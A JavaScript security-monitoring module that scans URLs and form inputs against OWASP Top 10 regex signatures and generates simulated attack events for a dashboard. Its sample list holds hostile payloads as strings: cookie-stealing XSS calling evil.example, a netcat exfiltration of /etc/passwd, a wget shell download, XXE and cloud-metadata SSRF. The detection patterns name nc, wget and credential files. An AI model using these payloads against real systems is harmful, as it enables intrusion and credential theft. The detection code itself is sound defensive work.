/**
 * CipherTools Threat Monitor
 * Real-Time Threat Detection & Monitoring Module
 *
 * DISCLAIMER: This module is designed exclusively for authorized security
 * monitoring and self-attack simulation on your own website infrastructure.
 * It detects and logs common attack patterns against the current origin for
 * dashboard visualization and security posture assessment purposes.
 *
 * Covers OWASP Top 10 attack signatures for detection.
 * Zero external dependencies - vanilla JavaScript only.
 */

class ThreatMonitor {
    constructor(options = {}) {
        this.origin = window.location.origin;
        this.threats = [];
        this.listeners = {};
        this.isMonitoring = false;
        this._intervalId = null;
        this._simulationId = null;
        this._requestLog = [];
        this._ipRateMap = {};

        // Configuration
        this.config = {
            monitorInterval: options.monitorInterval || 2000,
            simulationInterval: options.simulationInterval || 4000,
            maxThreats: options.maxThreats || 500,
            rateLimitThreshold: options.rateLimitThreshold || 30,
            rateLimitWindow: options.rateLimitWindow || 60000,
            enableSimulation: options.enableSimulation !== undefined ? options.enableSimulation : true
        };

        // -------------------------------------------------------------------
        // OWASP Top 10 Attack Signatures (2021 edition mapping)
        // -------------------------------------------------------------------
        this.signatures = {
            // A01:2021 - Broken Access Control
            pathTraversal: {
                patterns: [
                    /\.\.\//,
                    /\.\.\\/,
                    /%2e%2e%2f/i,
                    /%2e%2e%5c/i,
                    /\.\.%252f/i,
                    /\.\.\%c0%af/i,
                    /\/etc\/passwd/i,
                    /\/etc\/shadow/i,
                    /\/windows\/win\.ini/i,
                    /\/windows\/system32/i,
                    /\/proc\/self/i
                ],
                severity: 'high',
                category: 'Path Traversal',
                owasp: 'A01:2021 Broken Access Control'
            },
            idor: {
                patterns: [
                    /[?&](user_?id|account_?id|profile_?id|doc_?id)=\d+/i,
                    /\/api\/users\/\d+/i,
                    /\/admin\//i,
                    /\/api\/v\d+\/admin/i
                ],
                severity: 'medium',
                category: 'IDOR Attempt',
                owasp: 'A01:2021 Broken Access Control'
            },

            // A02:2021 - Cryptographic Failures
            sensitiveDataExposure: {
                patterns: [
                    /[?&](password|passwd|secret|token|api_?key|apikey)=/i,
                    /[?&](ssn|credit_?card|cc_?num)=/i,
                    /Authorization:\s*Basic\s+/i
                ],
                severity: 'critical',
                category: 'Sensitive Data Exposure',
                owasp: 'A02:2021 Cryptographic Failures'
            },

            // A03:2021 - Injection
            sqlInjection: {
                patterns: [
                    /['"]?\s*(OR|AND)\s+['"]?\d+['"]?\s*=\s*['"]?\d+/i,
                    /UNION\s+(ALL\s+)?SELECT/i,
                    /;\s*(DROP|DELETE|INSERT|UPDATE|ALTER)\s+/i,
                    /'\s*(--|#|\/\*)/,
                    /EXEC\s+(xp_|sp_)/i,
                    /WAITFOR\s+DELAY/i,
                    /BENCHMARK\s*\(/i,
                    /SLEEP\s*\(\s*\d+\s*\)/i,
                    /ORDER\s+BY\s+\d+--/i,
                    /HAVING\s+\d+\s*=\s*\d+/i,
                    /GROUP\s+BY\s+.*--/i,
                    /INTO\s+(OUT|DUMP)FILE/i
                ],
                severity: 'critical',
                category: 'SQL Injection',
                owasp: 'A03:2021 Injection'
            },
            nosqlInjection: {
                patterns: [
                    /\{\s*['"$]\$(ne|gt|lt|gte|lte|in|nin|regex|where|exists)/i,
                    /\$where\s*:\s*['"]?function/i,
                    /\{\s*['"]\$regex['"]\s*:/i
                ],
                severity: 'high',
                category: 'NoSQL Injection',
                owasp: 'A03:2021 Injection'
            },
            commandInjection: {
                patterns: [
                    /;\s*(ls|cat|whoami|id|uname|wget|curl|nc|netcat)\b/i,
                    /\|\s*(ls|cat|whoami|id|uname|wget|curl|nc)\b/i,
                    /`[^`]*`/,
                    /\$\([^)]*\)/,
                    /&\s*(dir|type|net\s+user|ipconfig|systeminfo)\b/i
                ],
                severity: 'critical',
                category: 'Command Injection',
                owasp: 'A03:2021 Injection'
            },
            ldapInjection: {
                patterns: [
                    /[)(|*\\]\s*\(\s*[a-z]+=\*/i,
                    /\*\)\(\|/,
                    /\)\(&\)/
                ],
                severity: 'high',
                category: 'LDAP Injection',
                owasp: 'A03:2021 Injection'
            },

            // A03:2021 - Injection (XSS)
            xssReflected: {
                patterns: [
                    /<script[\s>]/i,
                    /<\/script>/i,
                    /javascript\s*:/i,
                    /on(load|error|click|mouseover|focus|blur|submit|change|input|keydown|keyup)\s*=/i,
                    /<img[^>]+onerror/i,
                    /<svg[^>]+onload/i,
                    /<iframe[^>]+src\s*=\s*['"]?javascript/i,
                    /<body[^>]+onload/i,
                    /<details[^>]+ontoggle/i,
                    /document\.(cookie|location|write)/i,
                    /\balert\s*\(/i,
                    /\beval\s*\(/i,
                    /\bprompt\s*\(/i,
                    /\bconfirm\s*\(/i,
                    /String\.fromCharCode/i,
                    /\\u003c/i,
                    /&#x3c;/i,
                    /&#60;/i
                ],
                severity: 'high',
                category: 'XSS (Cross-Site Scripting)',
                owasp: 'A03:2021 Injection'
            },
            xssDom: {
                patterns: [
                    /\.innerHTML\s*=(?!=)/,
                    /\.outerHTML\s*=(?!=)/,
                    /document\.write\s*\(/,
                    /\.insertAdjacentHTML\s*\(/,
                    /\beval\s*\(\s*location/i,
                    /\beval\s*\(\s*document\.URL/i
                ],
                severity: 'high',
                category: 'DOM-Based XSS',
                owasp: 'A03:2021 Injection'
            },

            // A04:2021 - Insecure Design
            massAssignment: {
                patterns: [
                    /[?&](role|is_?admin|is_?superuser|privilege|permission)=/i,
                    /[?&](admin|moderator|superuser)=(true|1|yes)/i
                ],
                severity: 'medium',
                category: 'Mass Assignment',
                owasp: 'A04:2021 Insecure Design'
            },

            // A05:2021 - Security Misconfiguration
            xxeInjection: {
                patterns: [
                    /<!DOCTYPE[^>]*\[/i,
                    /<!ENTITY/i,
                    /SYSTEM\s+['"]file:\/\//i,
                    /SYSTEM\s+['"]http/i
                ],
                severity: 'critical',
                category: 'XXE Injection',
                owasp: 'A05:2021 Security Misconfiguration'
            },

            // A07:2021 - Identification and Authentication Failures
            bruteForce: {
                patterns: [],
                severity: 'high',
                category: 'Brute Force',
                owasp: 'A07:2021 Auth Failures'
            },
            credentialStuffing: {
                patterns: [
                    /[?&](username|user|email|login)=.+&(password|passwd|pass)=/i
                ],
                severity: 'high',
                category: 'Credential Stuffing',
                owasp: 'A07:2021 Auth Failures'
            },

            // A08:2021 - Software and Data Integrity Failures
            prototypePollution: {
                patterns: [
                    /__proto__/,
                    /constructor\s*\[\s*['"]prototype['"]\s*\]/,
                    /Object\.assign\s*\(\s*\{\s*\}\s*,.*__proto__/
                ],
                severity: 'high',
                category: 'Prototype Pollution',
                owasp: 'A08:2021 Integrity Failures'
            },

            // A09:2021 - Security Logging and Monitoring Failures
            logInjection: {
                patterns: [
                    /\r\n/,
                    /%0d%0a/i,
                    /\n.*HTTP\/\d/i
                ],
                severity: 'medium',
                category: 'Log Injection / CRLF',
                owasp: 'A09:2021 Logging Failures'
            },

            // A10:2021 - Server-Side Request Forgery (SSRF)
            ssrf: {
                patterns: [
                    /[?&](url|uri|path|dest|redirect|next|target|rurl|return_url)=https?:\/\//i,
                    /[?&](url|uri|path|dest)=.*localhost/i,
                    /[?&](url|uri|path|dest)=.*127\.0\.0\.1/i,
                    /[?&](url|uri|path|dest)=.*0\.0\.0\.0/i,
                    /[?&](url|uri|path|dest)=.*169\.254\.\d+\.\d+/i,
                    /[?&](url|uri|path|dest)=.*\[::1\]/i
                ],
                severity: 'high',
                category: 'SSRF Attempt',
                owasp: 'A10:2021 SSRF'
            }
        };

        // -------------------------------------------------------------------
        // Simulated attack scenarios for dashboard visualization
        // -------------------------------------------------------------------
        this._simulatedAttacks = [
            {
                type: 'sqlInjection',
                source: '192.168.1.' + this._randInt(2, 254),
                payload: "' OR '1'='1' --",
                target: '/api/login',
                method: 'POST'
            },
            {
                type: 'sqlInjection',
                source: '10.0.0.' + this._randInt(2, 254),
                payload: "1 UNION SELECT username,password FROM users--",
                target: '/api/search?q=',
                method: 'GET'
            },
            {
                type: 'sqlInjection',
                source: '172.16.' + this._randInt(0, 31) + '.' + this._randInt(2, 254),
                payload: "'; WAITFOR DELAY '0:0:5'--",
                target: '/api/products?id=',
                method: 'GET'
            },
            {
                type: 'xssReflected',
                source: '203.0.113.' + this._randInt(2, 254),
                payload: '<script>document.location="https://evil.example/steal?c="+document.cookie</script>',
                target: '/search?q=',
                method: 'GET'
            },
            {
                type: 'xssReflected',
                source: '198.51.100.' + this._randInt(2, 254),
                payload: '<img src=x onerror="fetch(\'https://evil.example/\'+document.cookie)">',
                target: '/profile?name=',
                method: 'GET'
            },
            {
                type: 'xssReflected',
                source: '203.0.113.' + this._randInt(2, 254),
                payload: '<svg onload="alert(String.fromCharCode(88,83,83))">',
                target: '/comment',
                method: 'POST'
            },
            {
                type: 'pathTraversal',
                source: '10.0.' + this._randInt(0, 255) + '.' + this._randInt(2, 254),
                payload: '../../../etc/passwd',
                target: '/api/files?path=',
                method: 'GET'
            },
            {
                type: 'pathTraversal',
                source: '172.16.' + this._randInt(0, 31) + '.' + this._randInt(2, 254),
                payload: '..%252f..%252f..%252fetc%252fshadow',
                target: '/download?file=',
                method: 'GET'
            },
            {
                type: 'bruteForce',
                source: '192.168.10.' + this._randInt(2, 254),
                payload: 'Rapid login attempts detected (45 attempts in 60s)',
                target: '/api/login',
                method: 'POST'
            },
            {
                type: 'bruteForce',
                source: '10.10.' + this._randInt(0, 255) + '.' + this._randInt(2, 254),
                payload: 'Credential stuffing: 120 unique username/password combos in 30s',
                target: '/api/auth/signin',
                method: 'POST'
            },
            {
                type: 'commandInjection',
                source: '198.51.100.' + this._randInt(2, 254),
                payload: '; cat /etc/passwd | nc attacker.example 4444',
                target: '/api/ping?host=',
                method: 'GET'
            },
            {
                type: 'commandInjection',
                source: '203.0.113.' + this._randInt(2, 254),
                payload: '$(wget http://evil.example/shell.sh -O /tmp/s.sh)',
                target: '/api/diagnostic',
                method: 'POST'
            },
            {
                type: 'xxeInjection',
                source: '172.16.' + this._randInt(0, 31) + '.' + this._randInt(2, 254),
                payload: '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
                target: '/api/import',
                method: 'POST'
            },
            {
                type: 'ssrf',
                source: '10.0.' + this._randInt(0, 255) + '.' + this._randInt(2, 254),
                payload: 'url=http://169.254.169.254/latest/meta-data/iam/security-credentials/',
                target: '/api/fetch?',
                method: 'GET'
            },
            {
                type: 'ssrf',
                source: '192.168.1.' + this._randInt(2, 254),
                payload: 'url=http://127.0.0.1:6379/',
                target: '/api/proxy?',
                method: 'GET'
            },
            {
                type: 'nosqlInjection',
                source: '203.0.113.' + this._randInt(2, 254),
                payload: '{"username":{"$ne":""},"password":{"$ne":""}}',
                target: '/api/login',
                method: 'POST'
            },
            {
                type: 'prototypePollution',
                source: '198.51.100.' + this._randInt(2, 254),
                payload: '{"__proto__":{"isAdmin":true}}',
                target: '/api/user/settings',
                method: 'PUT'
            },
            {
                type: 'logInjection',
                source: '10.0.' + this._randInt(0, 255) + '.' + this._randInt(2, 254),
                payload: 'admin%0d%0a[SUCCESS] Admin login from 10.0.0.1',
                target: '/api/login?username=',
                method: 'GET'
            },
            {
                type: 'sensitiveDataExposure',
                source: '192.168.5.' + this._randInt(2, 254),
                payload: 'password=hunter2&api_key=sk_live_abc123',
                target: '/api/debug?',
                method: 'GET'
            },
            {
                type: 'idor',
                source: '172.16.' + this._randInt(0, 31) + '.' + this._randInt(2, 254),
                payload: 'Sequential user ID enumeration: /api/users/1 through /api/users/500',
                target: '/api/users/',
                method: 'GET'
            },
            {
                type: 'credentialStuffing',
                source: '198.51.100.' + this._randInt(2, 254),
                payload: 'Automated login with breached credential list (200 combos/min)',
                target: '/api/login',
                method: 'POST'
            },
            {
                type: 'massAssignment',
                source: '203.0.113.' + this._randInt(2, 254),
                payload: '{"name":"attacker","role":"admin","is_superuser":true}',
                target: '/api/user/profile',
                method: 'PUT'
            },
            {
                type: 'xssDom',
                source: '10.0.' + this._randInt(0, 255) + '.' + this._randInt(2, 254),
                payload: 'document.getElementById("output").innerHTML = location.hash.slice(1)',
                target: '/page#<img src=x onerror=alert(1)>',
                method: 'GET'
            },
            {
                type: 'ldapInjection',
                source: '192.168.2.' + this._randInt(2, 254),
                payload: '*)(uid=*))(|(uid=*',
                target: '/api/ldap/search?user=',
                method: 'GET'
            }
        ];
    }

    // -------------------------------------------------------------------
    // Utility helpers
    // -------------------------------------------------------------------

    _timestamp() {
        return new Date().toISOString();
    }

    _randInt(min, max) {
        return Math.floor(Math.random() * (max - min + 1)) + min;
    }

    _generateId() {
        return 'threat_' + Date.now() + '_' + Math.random().toString(36).substring(2, 9);
    }

    _generateIP() {
        var subnets = ['192.168.1.', '10.0.0.', '172.16.0.', '203.0.113.', '198.51.100.'];
        return subnets[this._randInt(0, subnets.length - 1)] + this._randInt(2, 254);
    }

    // -------------------------------------------------------------------
    // Event system
    // -------------------------------------------------------------------

    on(event, callback) {
        if (!this.listeners[event]) {
            this.listeners[event] = [];
        }
        this.listeners[event].push(callback);
        return this;
    }

    off(event, callback) {
        if (!this.listeners[event]) return this;
        if (!callback) {
            this.listeners[event] = [];
        } else {
            this.listeners[event] = this.listeners[event].filter(function(cb) {
                return cb !== callback;
            });
        }
        return this;
    }

    _emit(event, data) {
        if (!this.listeners[event]) return;
        for (var i = 0; i < this.listeners[event].length; i++) {
            try {
                this.listeners[event][i](data);
            } catch (err) {
                console.error('[ThreatMonitor] Event listener error:', err);
            }
        }
    }

    // -------------------------------------------------------------------
    // Threat management
    // -------------------------------------------------------------------

    _addThreat(threat) {
        // Enforce max threats limit (FIFO)
        if (this.threats.length >= this.config.maxThreats) {
            this.threats.shift();
        }

        var entry = {
            id: this._generateId(),
            timestamp: this._timestamp(),
            severity: threat.severity || 'medium',
            type: threat.type || 'unknown',
            category: threat.category || 'Unknown',
            owasp: threat.owasp || 'N/A',
            source: threat.source || 'unknown',
            target: threat.target || window.location.pathname,
            method: threat.method || 'GET',
            payload: threat.payload || '',
            details: threat.details || '',
            blocked: threat.blocked !== undefined ? threat.blocked : true
        };

        this.threats.push(entry);
        this._emit('threat', entry);
        this._emit('update', { threats: this.threats, stats: this.getThreatStats() });

        return entry;
    }

    // -------------------------------------------------------------------
    // Input scanning - analyze a string for attack patterns
    // -------------------------------------------------------------------

    scanInput(input, context) {
        var detections = [];
        var self = this;
        var ctx = context || {};

        Object.keys(this.signatures).forEach(function(sigKey) {
            var sig = self.signatures[sigKey];
            if (!sig.patterns || sig.patterns.length === 0) return;

            for (var i = 0; i < sig.patterns.length; i++) {
                if (sig.patterns[i].test(input)) {
                    var threat = self._addThreat({
                        severity: sig.severity,
                        type: sigKey,
                        category: sig.category,
                        owasp: sig.owasp,
                        source: ctx.source || 'local',
                        target: ctx.target || window.location.pathname,
                        method: ctx.method || 'GET',
                        payload: input.length > 200 ? input.substring(0, 200) + '...' : input,
                        details: 'Matched signature: ' + sig.category + ' (pattern: ' + sig.patterns[i].source + ')',
                        blocked: ctx.blocked !== undefined ? ctx.blocked : true
                    });
                    detections.push(threat);
                    break; // One detection per signature category is enough
                }
            }
        });

        return detections;
    }

    // -------------------------------------------------------------------
    // Request rate tracking (simulated per-IP)
    // -------------------------------------------------------------------

    _trackRequest(ip) {
        var now = Date.now();
        if (!this._ipRateMap[ip]) {
            this._ipRateMap[ip] = [];
        }

        this._ipRateMap[ip].push(now);

        // Clean up old entries outside the rate window
        var self = this;
        this._ipRateMap[ip] = this._ipRateMap[ip].filter(function(ts) {
            return (now - ts) < self.config.rateLimitWindow;
        });

        var count = this._ipRateMap[ip].length;

        if (count > this.config.rateLimitThreshold) {
            this._addThreat({
                severity: 'high',
                type: 'bruteForce',
                category: 'Brute Force / Rate Limit Exceeded',
                owasp: 'A07:2021 Auth Failures',
                source: ip,
                target: '/api/login',
                method: 'POST',
                payload: count + ' requests in ' + (self.config.rateLimitWindow / 1000) + 's window',
                details: 'IP ' + ip + ' exceeded rate limit threshold of ' + self.config.rateLimitThreshold + ' requests per ' + (self.config.rateLimitWindow / 1000) + 's. Current count: ' + count,
                blocked: true
            });
            return true;
        }
        return false;
    }

    // -------------------------------------------------------------------
    // Real-time DOM monitoring
    // -------------------------------------------------------------------

    _monitorDOM() {
        var self = this;

        // Monitor URL for suspicious parameters
        var search = window.location.search;
        var hash = window.location.hash;

        if (search.length > 1) {
            this.scanInput(search, {
                source: 'url-params',
                target: window.location.pathname,
                method: 'GET'
            });
        }

        if (hash.length > 1) {
            this.scanInput(hash, {
                source: 'url-hash',
                target: window.location.pathname,
                method: 'GET'
            });
        }

        // Monitor form submissions for attack payloads
        var forms = document.querySelectorAll('form');
        forms.forEach(function(form) {
            if (!form._threatMonitorBound) {
                form._threatMonitorBound = true;
                form.addEventListener('submit', function() {
                    var inputs = form.querySelectorAll('input, textarea');
                    inputs.forEach(function(input) {
                        if (input.value && input.value.length > 2) {
                            self.scanInput(input.value, {
                                source: 'form-input',
                                target: form.action || window.location.pathname,
                                method: (form.method || 'GET').toUpperCase()
                            });
                        }
                    });
                });
            }
        });
    }

    // -------------------------------------------------------------------
    // Simulation engine - generates realistic attack patterns
    // -------------------------------------------------------------------

    _runSimulation() {
        if (!this.config.enableSimulation || !this.isMonitoring) return;

        // Pick a random simulated attack
        var attackIndex = this._randInt(0, this._simulatedAttacks.length - 1);
        var attack = this._simulatedAttacks[attackIndex];
        var sig = this.signatures[attack.type];

        if (!sig) return;

        // Refresh the source IP occasionally for realism
        var source = attack.source;
        if (Math.random() < 0.3) {
            source = this._generateIP();
        }

        // Track the request rate for this IP
        this._trackRequest(source);

        // Add the threat
        this._addThreat({
            severity: sig.severity,
            type: attack.type,
            category: sig.category,
            owasp: sig.owasp,
            source: source,
            target: attack.target,
            method: attack.method,
            payload: attack.payload,
            details: 'Simulated ' + sig.category + ' attack detected and blocked. Target endpoint: ' + attack.target,
            blocked: Math.random() < 0.85 // 85% blocked, 15% require review
        });

        // Occasionally generate burst attacks (simulated brute force)
        if (Math.random() < 0.15) {
            var burstIP = this._generateIP();
            var burstCount = this._randInt(5, 12);
            for (var i = 0; i < burstCount; i++) {
                this._trackRequest(burstIP);
            }
        }
    }

    // -------------------------------------------------------------------
    // Public API
    // -------------------------------------------------------------------

    startMonitoring() {
        if (this.isMonitoring) return this;

        this.isMonitoring = true;
        var self = this;

        this._emit('status', { monitoring: true, message: 'Threat monitoring started' });

        // DOM monitoring interval
        this._intervalId = setInterval(function() {
            self._monitorDOM();
        }, this.config.monitorInterval);

        // Simulation interval
        if (this.config.enableSimulation) {
            this._simulationId = setInterval(function() {
                self._runSimulation();
            }, this.config.simulationInterval);

            // Run an initial simulated attack immediately for responsiveness
            setTimeout(function() {
                self._runSimulation();
            }, 500);
        }

        // Initial DOM scan
        this._monitorDOM();

        return this;
    }

    stopMonitoring() {
        this.isMonitoring = false;

        if (this._intervalId) {
            clearInterval(this._intervalId);
            this._intervalId = null;
        }
        if (this._simulationId) {
            clearInterval(this._simulationId);
            this._simulationId = null;
        }

        this._emit('status', { monitoring: false, message: 'Threat monitoring stopped' });
        return this;
    }

    getThreats(filter) {
        if (!filter) return this.threats.slice();

        return this.threats.filter(function(t) {
            if (filter.severity && t.severity !== filter.severity) return false;
            if (filter.type && t.type !== filter.type) return false;
            if (filter.category && t.category !== filter.category) return false;
            if (filter.source && t.source !== filter.source) return false;
            if (filter.blocked !== undefined && t.blocked !== filter.blocked) return false;
            if (filter.since) {
                var since = new Date(filter.since).getTime();
                var tTime = new Date(t.timestamp).getTime();
                if (tTime < since) return false;
            }
            return true;
        });
    }

    getThreatStats() {
        var stats = {
            total: this.threats.length,
            blocked: 0,
            unblocked: 0,
            bySeverity: { low: 0, medium: 0, high: 0, critical: 0 },
            byCategory: {},
            bySource: {},
            byOwasp: {},
            recentPerMinute: 0,
            topSources: [],
            topCategories: []
        };

        var now = Date.now();
        var oneMinuteAgo = now - 60000;
        var recentCount = 0;

        for (var i = 0; i < this.threats.length; i++) {
            var t = this.threats[i];

            // Blocked vs unblocked
            if (t.blocked) stats.blocked++;
            else stats.unblocked++;

            // By severity
            if (stats.bySeverity[t.severity] !== undefined) {
                stats.bySeverity[t.severity]++;
            }

            // By category
            if (!stats.byCategory[t.category]) stats.byCategory[t.category] = 0;
            stats.byCategory[t.category]++;

            // By source
            if (!stats.bySource[t.source]) stats.bySource[t.source] = 0;
            stats.bySource[t.source]++;

            // By OWASP
            if (!stats.byOwasp[t.owasp]) stats.byOwasp[t.owasp] = 0;
            stats.byOwasp[t.owasp]++;

            // Recent count
            var tTime = new Date(t.timestamp).getTime();
            if (tTime >= oneMinuteAgo) recentCount++;
        }

        stats.recentPerMinute = recentCount;

        // Top sources
        var sourceEntries = Object.entries(stats.bySource);
        sourceEntries.sort(function(a, b) { return b[1] - a[1]; });
        stats.topSources = sourceEntries.slice(0, 10).map(function(entry) {
            return { ip: entry[0], count: entry[1] };
        });

        // Top categories
        var catEntries = Object.entries(stats.byCategory);
        catEntries.sort(function(a, b) { return b[1] - a[1]; });
        stats.topCategories = catEntries.slice(0, 10).map(function(entry) {
            return { category: entry[0], count: entry[1] };
        });

        return stats;
    }

    clearThreats() {
        this.threats = [];
        this._ipRateMap = {};
        this._requestLog = [];
        this._emit('update', { threats: this.threats, stats: this.getThreatStats() });
        this._emit('clear', { message: 'Threat log cleared' });
        return this;
    }

    // -------------------------------------------------------------------
    // Convenience: Get severity color for UI rendering
    // -------------------------------------------------------------------

    static getSeverityColor(severity) {
        var colors = {
            low: '#3b82f6',
            medium: '#fb923c',
            high: '#ef4444',
            critical: '#dc2626'
        };
        return colors[severity] || '#71717a';
    }

    static getSeverityLabel(severity) {
        var labels = {
            low: 'LOW',
            medium: 'MEDIUM',
            high: 'HIGH',
            critical: 'CRITICAL'
        };
        return labels[severity] || 'UNKNOWN';
    }
}

// Export for use in other modules
if (typeof module !== 'undefined' && module.exports) {
    module.exports = { ThreatMonitor };
}
